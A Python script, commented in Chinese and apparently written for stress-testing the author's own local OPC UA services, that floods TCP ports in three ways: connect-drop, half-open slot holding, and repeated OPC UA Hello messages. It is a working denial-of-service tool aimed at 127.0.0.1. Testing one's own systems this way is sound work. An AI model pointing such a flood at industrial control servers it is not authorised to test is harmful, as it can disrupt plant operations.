#!/usr/bin/env python3
"""
OPC UA TCP 埠洪水測試工具（僅供本機、自有系統的防禦性安全測試）

三階段：
  A  connect-drop  : TCP 三向握手完成即關閉，衝擊 accept 迴圈
  B  half-open     : connect 後不送任何 bytes、也不關，佔住連線槽
  C  ua-hello      : 送一個 OPC UA Hello (HEL) 訊息後停住，逼 server 分配 SecureChannel 資源

用法（--port 指定目標埠：4840=aggregation_server, 4842=sensor_pub, 4801=motor_sub）：
  python3 dos_flood.py A --conns 20 --rate 20 --dur 15 --port 4842
  python3 dos_flood.py B --conns 50 --dur 30 --port 4842
  python3 dos_flood.py C --conns 20 --rate 20 --dur 15 --port 4842

漸進式：先用小 --rate/--conns，觀察 log，再逐步加大。
Ctrl-C 可隨時中止，會嘗試關閉所有開著的 socket。
"""
import socket, time, threading, argparse, sys, signal, struct

HOST = "127.0.0.1"
PORT = 4840

stop = threading.Event()
opened = 0
failed = 0
lock = threading.Lock()
held = []  # 階段 B/C 要保留的 socket

def bump(ok):
    global opened, failed
    with lock:
        if ok: opened += 1
        else:  failed += 1

# --- 一個合法的 OPC UA Hello (HEL) 訊息 ---------------------------------------
def build_hello(port):
    url = ("opc.tcp://127.0.0.1:%d" % port).encode()
    body = struct.pack("<IIIII", 0, 65535, 65535, 0, 0)
    body += struct.pack("<i", len(url)) + url
    msg_size = 8 + len(body)
    header = b"HELF" + struct.pack("<I", msg_size)
    return header + body

def worker_connect_drop():
    while not stop.is_set():
        try:
            s = socket.create_connection((HOST, PORT), timeout=2)
            bump(True)
            s.close()               # 立刻關閉
        except Exception:
            bump(False)
        time.sleep(interval)

def worker_half_open():
    try:
        s = socket.create_connection((HOST, PORT), timeout=2)
        bump(True)
        with lock: held.append(s)
        while not stop.is_set():
            time.sleep(0.5)
    except Exception:
        bump(False)

def worker_ua_hello():
    hello = build_hello(PORT)
    while not stop.is_set():
        try:
            s = socket.create_connection((HOST, PORT), timeout=2)
            s.sendall(hello)        # 送半個握手後停住
            bump(True)
            with lock: held.append(s)
        except Exception:
            bump(False)
        time.sleep(interval)

def reporter():
    last = 0
    while not stop.is_set():
        time.sleep(1)
        with lock:
            print(f"[{time.strftime('%H:%M:%S')}] 累計成功連線={opened} 失敗={failed} "
                  f"(本秒 +{opened-last}) 仍持有={len(held)}", flush=True)
            last = opened

def cleanup(*_):
    stop.set()
    with lock:
        for s in held:
            try: s.close()
            except Exception: pass
    print(f"\n[結束] 總成功={opened} 總失敗={failed}", flush=True)
    sys.exit(0)

if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("phase", choices=["A", "B", "C"])
    ap.add_argument("--rate",  type=int, default=20, help="A/C: 每秒每執行緒嘗試次數")
    ap.add_argument("--conns", type=int, default=50, help="B: 同時持有的半開連線數 / A,C: 並發執行緒數")
    ap.add_argument("--dur",   type=int, default=15, help="持續秒數（0=直到 Ctrl-C）")
    ap.add_argument("--port",  type=int, default=PORT)
    args = ap.parse_args()
    PORT = args.port
    interval = 1.0 / max(args.rate, 1)

    signal.signal(signal.SIGINT, cleanup)

    if args.phase == "A":
        target, n = worker_connect_drop, args.conns
        print(f"[階段A] connect-drop 洪水 → {HOST}:{PORT}  執行緒={n} rate={args.rate}/s/緒 時長={args.dur}s")
    elif args.phase == "B":
        target, n = worker_half_open, args.conns
        print(f"[階段B] half-open 佔槽 → {HOST}:{PORT}  持有連線={n} 時長={args.dur}s")
    else:
        target, n = worker_ua_hello, args.conns
        print(f"[階段C] OPC UA Hello 洪水 → {HOST}:{PORT}  執行緒={n} rate={args.rate}/s/緒 時長={args.dur}s")

    threading.Thread(target=reporter, daemon=True).start()
    ts = [threading.Thread(target=target, daemon=True) for _ in range(n)]
    for t in ts: t.start()

    if args.dur > 0:
        time.sleep(args.dur)
        cleanup()
    else:
        while True: time.sleep(1)
